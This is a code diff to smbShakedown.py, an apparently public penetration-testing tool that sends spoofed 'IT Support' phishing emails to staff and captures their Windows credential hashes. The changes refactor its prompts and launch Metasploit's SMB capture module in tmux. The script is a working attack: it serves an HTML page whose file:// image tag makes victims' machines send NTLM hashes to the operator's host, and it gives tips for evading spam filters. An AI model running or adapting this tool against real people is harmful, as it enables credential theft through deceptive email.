@@ -2,7 +2,7 @@
 # Description: A simplified SMB Email Client Attack script.
 # Created by: Nick Sanzotta / @beamr
 # Version: smbShakedown.py v 1.10252016.b
-import os, sys, smtplib, getpass, readline, socket, time
+import os, sys, smtplib, getpass, readline, socket, time, subprocess
 import urllib, json
 import readline
 readline.parse_and_bind("tab: complete")
@@ -11,12 +11,12 @@ import SocketServer, SimpleHTTPServer, multiprocessing
 rcfile = 'smbServ.rc'
 
 class colors:
-   white = "\033[1;37m"
-   normal = "\033[0;00m"
-   red = "\033[1;31m"
-   blue = "\033[1;34m"
-   green = "\033[1;32m"
-   x = "\033[1;35m"
+	white = "\033[1;37m"
+	normal = "\033[0;00m"
+	red = "\033[1;31m"
+	blue = "\033[1;34m"
+	green = "\033[1;32m"
+	x = "\033[1;35m"
 
 banner = colors.x + r"""
                   __        
@@ -42,7 +42,7 @@ banner = colors.x + r"""
 + colors.normal + ' ' + '*' * 95 +'\n' + colors.normal
 
 def cls():
-    os.system('cls' if os.name == 'nt' else 'clear')
+	os.system('cls' if os.name == 'nt' else 'clear')
 
 def get_external_address():
 	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
@@ -55,23 +55,58 @@ def get_internal_address():
 	print("Internal IP: "+s.getsockname()[0])
 	return s.getsockname()[0]
 
-def smbServ():
-	smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
-	choice = smbServOption.lower()
+def yes_no(answer):
 	yes = set(['yes','y', 'ye', ''])
 	no = set(['no','n'])
-	print('ENTERED: "%s"' % choice + "\n")
-	if choice in yes:
-		with open(rcfile, 'w') as f1:
-			f1.write("use auxiliary/server/capture/smb"+"\n"+\
-				"set srvhost "+get_internal_address()+"\n"+\
-				"set JOHNPWFILE /opt/smbShakedown/smb_hashes"+"\n"+\
-				"exploit -j -z")
-		os.system('msfconsole -q -r smbServ.rc')
-	elif choice in no:
-		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
-	else:
-		sys.stdout.write("Please respond with 'yes' or 'no'")
+	 
+	while True:
+		choice = raw_input(answer).lower()
+		if choice in yes:
+		   return True
+		elif choice in no:
+		   return False
+		else:
+			print ('Please respond with \'yes\' or \'no\'\n')
+
+def smbServ():
+	'''starts a metasploit smb capture server in a tmux session called msf_shakedown'''
+	smb_server_option = self.yes_no('Use a local Metasploit SMB capture server in a screen session called msf_shakedown? (y/n): ')
+	#FEATURE need to allow a choice of internal or external ip?
+	if smb_server_option is True:
+		rc_config = \
+		'use auxiliary/server/capture/smb\n'+\
+		'set srvhost {}\n'.format(self.internal_ip)+\
+		'set JOHNPWFILE /opt/smbShakedown/smb_hashes\n'+\
+		'exploit -j -z'
+		print('\n{}\n').format(str(rc_config))
+		#prompt user to ok the rc file config
+		validate_rc_file = self.yes_no('rc file ready to execute? (y/n): ')
+		#if they ok the file
+		if validate_rc_file is True:
+			#write the file
+			with open(self.rc_file, 'w') as rc_file:
+				rc_file.writelines(str(rc_config))
+				rc_file.close()
+			#use subprocess to open tmux new session and run msfconsole in it   
+			try:
+				print('Starting tmux...')
+				proc = subprocess.Popen(['tmux', 'new-session', '-d', '-s', 'msf_shakedown',\
+				 'msfconsole -q -r {}'.format(self.rc_file)], stdout=subprocess.PIPE)
+				(out, err) = proc.communicate()
+				print('Screen sessions: {}'.format(out))
+			except Exception as e:
+				print('Error: {}'.format(e))
+				sys.exit(1)
+		#if user opts to not run msfconsole smb capture locallly, provide a sample rc file
+		else:
+			print('You\'ll need to provide your own rc file. Here\'s a sample')
+			print('use auxiliary/server/capture/smb\n\
+set srvhost <YOUR.IP.ADDRESS.HERE>\n\
+set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
+exploit -j -z')
+
+
+
 
 def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage):
 	smtpserver = smtplib.SMTP(smtpServerAddress, smtpServerPort)
@@ -84,7 +119,23 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 	try:
 		status = smtpserver.noop()[0]
 		print("SMTP Server Status: ",status)
-		sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
+		
+		sendOption = yes_no('Connection to SMTP Server is successful, would you like to send mail now? (y/n): ')
+
+		if sendOption is True:
+			smtpserver.sendmail(senderAddress, recipientAddress, emailMessage)
+			print("Message(s) sent!")
+			smtpserver.quit()
+			return True
+		else:
+			smtpserver.quit()
+			print("Ok no mail sent.")
+			return False
+
+
+		'''sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
+		
+
 		choice = sendOption.lower()
 		yes = set(['yes','y', 'ye', ''])
 		no = set(['no','n'])
@@ -99,7 +150,9 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 			print("Ok no mail sent.")
 			return False
 		else:
-			sys.stdout.write("Please respond with 'yes' or 'no'")
+			sys.stdout.write("Please respond with 'yes' or 'no'")'''
+
+
 	except:
 		status = -1
 		print("[Aborting]SMTP Server Status: ",status)
@@ -114,7 +167,8 @@ def main():
 		print("Check your Internet connection")
 		sys.exit(0)
 	ipAddress = get_internal_address()
-	ipAddress = get_internal_address()
+	#duplicate
+	#ipAddress = get_internal_address()
 	print("\n")
 	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
 	print('ENTERED: "%s"' % smtpServerAddress + "\n")
@@ -126,7 +180,7 @@ def main():
 	print("\n")
 	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
 	print('ENTERED:' "%s" % senderName + "\n")
-	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or  'itsupport@company.com'
+	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or 'itsupport@company.com'
 	print('ENTERED:' "%s" % senderAddress + "\n")
 	recipientName = raw_input('Enter recipient(s) name[Company Staff]: ') or 'Company Staff'
 	print('ENTERED:' "%s" % recipientName + "\n")
@@ -150,12 +204,18 @@ def main():
 	print('ENTERED:' "%s" % smbCaptureServer + "\n")
 	#HYPER LINK OPTIONS
 	print('TIP: A HyperLink can be directed to an Webpage with an HTML IMG Tag.')
-	hyperLinkOption = raw_input('Would you like to add a HyperLink to your message?[yes]: ') or 'yes'
-	print('ENTERED:' "%s" % hyperLinkOption + "\n")
+
+	#use yes_no function instead of inline
+	#hyperLinkOption = raw_input('Would you like to add a HyperLink to your message?[yes]: ') or 'yes'
+	hyperLinkOption = yes_no('Would you like to add a HyperLink to your message? (y/n): ')
+
+	'''print('ENTERED:' "%s" % hyperLinkOption + "\n")
 	choice = hyperLinkOption.lower()
 	yes = set(['yes','y', 'ye', ''])
 	no = set(['no','n'])
-	if choice in yes:
+	if choice in yes:'''
+
+	if hyperLinkOption is True:
 		print('TIP: Domain based HyperLinks help avoid the "JunkFolder".')
 		hyperAddress = raw_input('Please enter a addresss without "http://": ['+extipAddress+']:' ) or extipAddress
 		print("ENTERED: " "%s" % "http://"+hyperAddress+"/" + "\n")
@@ -164,43 +224,56 @@ def main():
 		hyperLink = '<a href="http://'+hyperAddress+'/" target="_blank">'+hyperText+'</a>' 
 		#HTTP Server OPTIONS
 		print('TIP: You can point your HyperLink to a locally hosted Webpage.')
-		httpServOption = raw_input("Host local Webpage with an HTML IMG Tag?[yes]: ") or 'yes'
-		print('ENTERED:' "%s" % httpServOption + "\n")
+		
+
+		#use yes_no function instead of inline
+		#httpServOption = raw_input("Host local Webpage with an HTML IMG Tag?[yes]: ") or 'yes'
+		
+		httpServOption = yes_no('Host local Webpage with an HTML IMG Tag? (y/n)? ')
+		'''print('ENTERED:' "%s" % httpServOption + "\n")
 		choice = httpServOption.lower()
 		yes = set(['yes','y', 'ye', ''])
 		no = set(['no','n'])
-		if choice in yes:
+		if choice in yes:'''
+		if httpServOption is True:
 			httpPort = raw_input("HTTP Server Port?:[80]") or 80
 			print('ENTERED:' "%s" % httpPort + "\n")
 			print("\n")
 			print("TIP: Coming soon...")
 			#Redirect OPTIONS
-			redirectOption = raw_input("Would you like a redirect on your Webpage?[yes]:") or 'yes'
-			print('ENTERED:' "%s" % redirectOption + "\n")
+			
+			#use yes_no function instead of inline
+			#redirectOption = raw_input("Would you like a redirect on your Webpage?[yes]:") or 'yes'
+			redirectOption = yes_no('Would you like a redirect on your Webpage? (y/n): ')
+
+			'''print('ENTERED:' "%s" % redirectOption + "\n")
 			choice = redirectOption.lower()
 			yes = set(['yes','y', 'ye', ''])
 			no = set(['no','n'])
-			if choice in yes:
+			if choice in yes:'''
+
+			if redirectOption is True:
 				redirect = raw_input('Enter redirect address[ex: client-site.com]:') or ''
 				print('ENTERED:' "%s" % redirect + "\n")
-			elif choice in no:
+			else:
 				print('Okay, Webpage will not redirect:')
 				redirect = ''
-			else:
-				sys.stdout.write("Please respond with 'yes' or 'no'")
+			'''else:
+				sys.stdout.write("Please respond with 'yes' or 'no'")'''
+
 		### EDIT: HTML Template Below ###
 		### Becareful not to remove the variables {0} and {1} ###
 			html = """
 			<!DOCTYPE HTML>
 			<html lang="en-US">
-	    		<head>
-	        		<meta charset="UTF-8">
-	        		<meta http-equiv="refresh" content="1;url={1}">
-	        		<script type="text/javascript">
-	            		window.location.href = "{1}"
-	        		</script>
-	        <title>SMB Egress Test Page.</title>
-	    	</head>
+				<head>
+					<meta charset="UTF-8">
+					<meta http-equiv="refresh" content="1;url={1}">
+					<script type="text/javascript">
+						window.location.href = "{1}"
+					</script>
+			<title>SMB Egress Test Page.</title>
+			</head>
 			<br>
 			<img src=file://{0}/image/foo.gif>
 			</body>
@@ -221,17 +294,17 @@ def main():
 			server_process.start()
 			print("Python SimpleHTTPServer now Listening on Port: " + str(httpPort))
 			print("\n")
-		elif choice in no:
-			print('Ok local HTTP Server not started: \n')
 		else:
-			sys.stdout.write("Please respond with 'yes' or 'no'")
+			print('Ok local HTTP Server not started: \n')
+		'''else:
+			sys.stdout.write("Please respond with 'yes' or 'no'")'''
 			
 	
-	elif choice in no:
+	else:
 		print('Okay, A Hyplink will not be added to your message: \n')
 		hyperLink = ''
-	else:
-		sys.stdout.write("Please respond with 'yes' or 'no'")
+	'''else:
+		sys.stdout.write("Please respond with 'yes' or 'no'")'''
 
 	
 ### EDIT: Email Message Template Below ###
